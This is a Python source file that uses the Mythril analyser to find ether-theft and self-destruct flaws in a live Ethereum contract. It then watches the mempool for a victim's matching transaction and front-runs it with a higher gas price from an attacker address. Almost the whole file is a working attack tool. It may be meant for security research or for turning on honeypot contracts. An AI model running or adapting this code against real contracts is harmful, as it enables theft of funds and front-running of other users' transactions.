import re
from mythril.mythril import MythrilAnalyzer, MythrilDisassembler, MythrilConfig
from mythril.exceptions import CriticalError
import json
from web3 import Web3
import time


class Exploit:
    def __init__(self, txs: list, rpc: str, contract: str, attacker: str):
        self.txs = txs
        self.w3 = Web3(Web3.HTTPProvider(rpc))
        self.contract = contract
        self.attacker = attacker
        pass

    def __repr__(self):
        return "Exploit: (txs={})".format(self.txs)

    def frontrun(self):
        print("Waiting for a victim to reach into the honey jar.")

        # Wait for each tx and frontrun it.
        for tx in self.txs:
            victim_tx = self.wait_for(self.contract, tx)

            frontrun_tx = {
                "from": self.attacker,
                "to": self.contract,
                "gasPrice": hex(int(victim_tx["gasPrice"], 16) + 1),
                "input": victim_tx["input"],
                "gas": victim_tx["gas"],
                "value": victim_tx["value"],
            }

            print("Frontrunning with tx: {tx}".format(tx=frontrun_tx))
            receipt = self.send_tx(frontrun_tx)
            print("Mined transaction: {tx}".format(tx=(receipt['transactionHash'].hex())))

    def send_tx(self, tx: dict) -> str:
        # Make sure the addresses are checksummed.
        tx["from"] = Web3.toChecksumAddress(tx["from"])
        tx["to"] = Web3.toChecksumAddress(tx["to"])

        tx_hash = self.w3.eth.sendTransaction(tx)
        tx_receipt = self.w3.eth.waitForTransactionReceipt(tx_hash, timeout=300)

        return tx_receipt

    def wait_for(self, contract, tx):
        print("Listening for {tx}.".format(tx=tx))

        while True:
            time.sleep(1)
            pending_txs = self.w3.txpool.content["pending"]

            for k in pending_txs:
                pending_tx = pending_txs[k]

                for index in pending_tx:
                    if (pending_tx[index]["to"] == contract) and (
                        pending_tx[index]["input"] == tx.tx_data["input"]
                    ):
                        print(
                            "Found pending tx: {tx} from: {sender}.".format(
                                tx=pending_tx[index]['hash'], sender=pending_tx[index]["from"]
                            )
                        )
                        return pending_tx[index]


class ExploitItem:
    def __init__(self, tx_data: dict, rpc: str):
        self.tx_data = tx_data
        self.w3 = Web3(Web3.HTTPProvider(rpc))

    def __repr__(self):
        return "Transaction: {}".format(self.tx_data)

    def run(self):
        print("Running tx")
        pass


def find_exploits(rpc, contract, attacker):
    conf = MythrilConfig()

    if re.match(r"^https", rpc):
        rpchost = rpc[8:]
        rpctls = True
    else:
        rpchost = rpc[7:]
        rpctls = False

    conf.set_api_rpc(rpchost, rpctls)

    try:
        disassembler = MythrilDisassembler(eth=conf.eth, enable_online_lookup=False)
        disassembler.load_from_address(contract)
        analyzer = MythrilAnalyzer(
            strategy="bfs",
            disassembler=disassembler,
            address=contract,
            execution_timeout=120,
            max_depth=32,
            loop_bound=3,
            disable_dependency_pruning=False,
            onchain_storage_access=True,
        )
    except CriticalError as e:
        print(e)

    report = analyzer.fire_lasers(
        modules=["ether_thief", "suicide"], transaction_count=3
    )

    exploits = []
    for ri in report.issues:
        txs = []
        issue = report.issues[ri]

        for si in issue.transaction_sequence["steps"]:
            txs.append(ExploitItem({"input": si["input"], "value": si["value"]}, rpc))

        exploits.append(Exploit(txs, rpc, contract, attacker))

    return exploits
